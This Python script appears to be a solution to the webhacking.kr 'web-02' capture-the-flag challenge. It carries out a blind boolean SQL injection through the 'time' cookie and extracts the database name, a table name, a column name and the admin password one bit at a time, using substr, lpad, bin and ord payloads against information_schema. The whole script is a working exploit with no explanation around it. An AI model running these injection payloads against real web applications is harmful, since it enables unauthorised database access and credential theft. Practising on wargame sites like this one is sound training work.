"""
1579066937 and 1=1 True
2070-01-01 09:00:01

1579066937 and 1=1 False
2070-01-01 09:00:00

dbname = chall2
"""
import requests
import string

session = 'your session' # input your session
headers = {'Content-Type': 'text/html; charset=UTF-8'}

dbname = ''
table_Name = ''
column_name = ''
def find_database():
    dblen = 0
    for payload in range(1,20):
        cookies = {'PHPSESSID': session, 'time':'1579066937 and (select length(database())={})'.format(payload)};
        url = "https://webhacking.kr/challenge/web-02/"
        response = requests.get(url, headers=headers, cookies=cookies)
        if "09:00:01" in response.text:
            dblen = payload
            break

    for index in range(1,dblen+1):
        bit = ''
        global dbname
        for payload in range(1,9):
            cookies = {'PHPSESSID': session, 'time':'1579066937 and (select substr(lpad(bin(ord(substr(database(),{},1))),8,0),{},1)=1)'.format(index,payload)};
            url = "https://webhacking.kr/challenge/web-02/"
            response = requests.get(url, headers=headers, cookies=cookies)
            if "09:00:01" in response.text:
                bit += '1'
            else:
                bit += '0'
        dbname += chr(int(bit,2))
    print("Database: ", dbname)

def find_table():
    table_Num = 0
    table_length = 0
    global table_Name
    for payload in range(1,30):
        cookies = {'PHPSESSID': session, 'time':'1579066937 and length((select table_name from information_schema.tables WHERE table_schema=\''+str(dbname)+'\'limit 1))={}'.format(payload)};
        url = "https://webhacking.kr/challenge/web-02/"
        response = requests.get(url, headers=headers, cookies=cookies)
        if "09:00:01" in response.text:
            table_length = payload
            break

    for index in range(1,table_length+1):
        bit = ''
        for payload in range(1,9):
            cookies = {'PHPSESSID': session, 'time':'1579066937 and substr(lpad(bin(ord(substr((select table_name from information_schema.tables WHERE \
            table_schema=\''+str(dbname)+'\' limit 1),{},1))),8,0),{},1)=1'.format(index,payload)};
            url = "https://webhacking.kr/challenge/web-02/"
            response = requests.get(url, headers=headers, cookies=cookies)
            if "09:00:01" in response.text:
                bit += '1'
            else:
                bit += '0'
        table_Name += chr(int(bit,2))
        
    print("table: ",table_Name)

def find_column():
    global table_Name
    global column_name
    column_length = 0
    for payload in range(1,30):
        cookies = {'PHPSESSID': session, 'time':'1579066937 and length((select column_name from information_schema.columns WHERE \
        table_name=\''+str(table_Name)+'\'limit 1))={}'.format(payload)};
        url = "https://webhacking.kr/challenge/web-02/"
        response = requests.get(url, headers=headers, cookies=cookies)
        if "09:00:01" in response.text:
            column_length = payload
            break

    for index in range(1,column_length+1):
        bit = ''
        for payload in range(1,9):
            cookies = {'PHPSESSID': session, 'time':'1579066937 and substr(lpad(bin(ord(substr((select column_name from information_schema.columns WHERE \
            table_name=\''+str(table_Name)+'\' limit 1),{},1))),8,0),{},1)=1'.format(index,payload)};
            url = "https://webhacking.kr/challenge/web-02/"
            response = requests.get(url, headers=headers, cookies=cookies)
            if "09:00:01" in response.text:
                bit += '1'
            else:
                bit += '0'
        column_name += chr(int(bit,2))
    print("column: " + column_name)

def find_pw():
    global table_Name
    global column_name
    pw_length = 0
    password = ''
    for payload in range(1,30):
        cookies = {'PHPSESSID': session, 'time':'1579066937 and length((select '+str(column_name)+' from '+str(table_Name)+' limit 1))={}'.format(payload)};
        url = "https://webhacking.kr/challenge/web-02/"
        response = requests.get(url, headers=headers, cookies=cookies)
        if "09:00:01" in response.text:
            pw_length = payload
            break

    for index in range(1,pw_length+1):
        bit = ''
        for payload in range(1,9):
            cookies = {'PHPSESSID': session, 'time':'1579066937 and substr(lpad(bin(ord(substr((select '+str(column_name)+' from '+str(table_Name)+'\
            limit 1),{},1))),8,0),{},1)=1'.format(index,payload)};
            url = "https://webhacking.kr/challenge/web-02/"
            response = requests.get(url, headers=headers, cookies=cookies)
            if "09:00:01" in response.text:
                bit += '1'
            else:
                bit += '0'
        password += chr(int(bit,2))
    print("admin password: " + password)

if __name__ == "__main__":
    find_database()
    find_table()
    find_column()
    find_pw()
